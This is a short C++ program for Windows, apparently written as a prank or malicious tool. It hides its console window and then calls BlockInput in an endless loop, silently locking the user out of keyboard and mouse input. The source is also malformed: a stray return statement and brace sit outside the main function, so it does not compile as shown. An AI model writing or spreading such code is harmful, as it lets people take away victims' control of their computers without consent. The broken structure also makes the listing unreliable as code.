#include <iostream>
#include <windows.h>

using namespace std;

int main(){
  FreeConsole(); //Hides Console
  
  while(1){
    BlockInput(true); //Blocks All Input
  }
}

return 0;
}
